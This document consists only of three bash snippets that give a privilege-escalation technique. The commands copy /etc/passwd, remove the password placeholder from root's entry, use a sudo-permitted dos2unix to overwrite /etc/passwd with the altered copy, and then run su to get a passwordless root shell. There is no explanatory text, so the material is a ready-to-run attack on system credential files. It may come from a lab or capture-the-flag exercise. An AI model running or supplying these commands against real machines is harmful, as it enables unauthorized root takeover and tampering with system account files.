```bash
cat /etc/passwd | grep root | tr -d 'x' > /tmp/passwd
cat /etc/passwd | grep -v root >> /tmp/passwd
```

```bash
passwd_new=/tmp/passwd
passwd_old=/etc/passwd
```

```bash
sudo /usr/bin/dos2unix -f -n "$passwd_new" "$passwd_old"
su
```
